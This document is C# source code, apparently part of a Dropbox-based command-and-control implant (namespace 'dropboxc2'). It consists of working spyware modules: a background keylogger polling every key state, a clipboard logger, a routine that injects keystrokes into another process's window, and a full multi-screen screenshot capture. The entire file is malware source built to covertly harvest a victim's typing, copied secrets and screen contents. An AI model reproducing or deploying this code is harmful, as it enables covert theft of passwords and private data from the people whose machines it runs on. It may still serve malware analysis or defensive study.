/*
Author: Arno0x0x, Twitter: @Arno0x0x
*/
using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace dropboxc2
{
    //****************************************************************************************
    // Class holding native Win32 API functions
    //****************************************************************************************
    internal static class NativeFunctions 
    {
        [DllImport("user32.dll")]
        internal static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("user32.dll")]
        internal static extern int SetForegroundWindow(IntPtr point);
        [DllImport("user32.dll")] 
        internal static extern int ShowWindow(int hwnd, int nCmdShow);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool AddClipboardFormatListener(IntPtr hwnd);
        [DllImport("user32.dll", SetLastError = true)]
        internal static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        internal const int WM_CLIPBOARDUPDATE = 0x031D;
        internal static IntPtr HWND_MESSAGE = new IntPtr(-3);
    }

    //****************************************************************************************
    // Class handling keylogging operations and thread
    //****************************************************************************************
    public static class KeyLogger
    {
        
        public delegate void KeyEventDelegate(Keys key);
        private static Thread _pollingThread;
        private static volatile Dictionary<Keys, bool> _keysStates = new Dictionary<Keys, bool>();
        private static bool exit = false;

        //------------------------------------------------------------------------------
        public static void Start()
        {
            if (_pollingThread != null && _pollingThread.IsAlive)
            {
                return;
            }
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
            {
                _keysStates[key] = false;
            }

            _pollingThread = new Thread(PollKeys) { IsBackground = true, Name = "KeyThread" };
            _pollingThread.Start();
        }

        //------------------------------------------------------------------------------
        public static void Stop()
        {
            exit = true;
        }

        //------------------------------------------------------------------------------
        private static void PollKeys()
        {
            while (true)
            {
                Thread.Sleep(40);
                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                {
                    if (((NativeFunctions.GetAsyncKeyState(key) & (1 << 15)) != 0))
                    {
                        if (_keysStates[key]) continue;
                        if (OnKeyDown != null) OnKeyDown.Invoke(key);
                        _keysStates[key] = true;
                    }
                    else
                    {
                        if (!_keysStates[key]) continue;
                        if (OnKeyUp != null) OnKeyUp.Invoke(key);
                        _keysStates[key] = false;
                    }
                }
                if (exit) break;
            }
        }

        public static event KeyEventDelegate OnKeyDown;
        public static event KeyEventDelegate OnKeyUp;
    }

    //****************************************************************************************
    // Class handling clipboard logging operations and thread
    //****************************************************************************************
    public static class ClipboardLogger
    {
        public delegate void ClipboardEventDelegate(string text);
        private static Thread _pollingThread;
        private static bool exit = false;
        private static TextBox tb;
        private static string lastContent;

        //------------------------------------------------------------------------------
        public static void Start()
        {
            if (_pollingThread != null && _pollingThread.IsAlive)
            {
                return;
            }
            
            tb = new TextBox();
            tb.Multiline = true;
            lastContent = "";
            _pollingThread = new Thread(PollClipboard) { IsBackground = true, Name = "ClipboardThread" };
            _pollingThread.Start();
        }

        //------------------------------------------------------------------------------
        public static void Stop()
        {
            exit = true;
        }

        //------------------------------------------------------------------------------
        private static void PollClipboard()
        {
            while (true)
            {
                Thread.Sleep(1000);
                tb.Paste();
                if (tb.Text != lastContent)
                {
                    lastContent = tb.Text;
                    if (OnKeyBoardEvent != null) OnKeyBoardEvent.Invoke(tb.Text);   
                }
                tb.Clear();

                if (exit) break;
            }
        }

        public static event ClipboardEventDelegate OnKeyBoardEvent;
    }

    //****************************************************************************************
    // Class for sending key strokes to a remote process
    //****************************************************************************************
    public static class KeyStrokes
    {
        //==================================================================================================
        // This method sends key strokes to a specified process identified by its name
        //==================================================================================================
        public static bool sendKeyStrokes(Process p, string keyStrokes)
        {
            try
            {
                IntPtr h = p.MainWindowHandle; // Find the process main Window
                NativeFunctions.SetForegroundWindow(h); // Set the process main window to foreground
                NativeFunctions.ShowWindow(h.ToInt32(),9); // Restore the window, in case it was minimized
                SendKeys.SendWait(keyStrokes); // Send the keytrokes to the process 
                return true;   
            }
            catch (Exception ex)
            {
                // Log the exception
#if (DEBUG)
                while (ex != null)
                {
                    Console.WriteLine("[ERROR] " + ex.Message);
                    ex = ex.InnerException;
                }
#endif
                return false;
            }
        }
    }

    //****************************************************************************************
    // Class for taking screenshot
    //****************************************************************************************
    public static class Screenshot
    {
        //==================================================================================================
        // This method returns a byte array of a JPG screenshot of all system's screens
        //==================================================================================================
        public static byte[] takeScreenShot()
        {
            int width = 0, height = 0;

            // Get all system screens (display, or monitors)
            Screen[] systemScreens = Screen.AllScreens;

            foreach (Screen screen in systemScreens)
            {
                Rectangle screenSize = screen.Bounds;
                width += screenSize.Width;
                if (screenSize.Height > height) height = screenSize.Height;
            }

            // Take a screenshot of the whole display, including all screens
            Bitmap target = new Bitmap(width, height);
            using (Graphics g = Graphics.FromImage(target))
            {
                g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
            }

            // Convert this screenshot to JPEG format and to a byte array in memory
            using (var stream = new MemoryStream())
            {
                target.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
                return stream.ToArray();
            }
        }
    }
}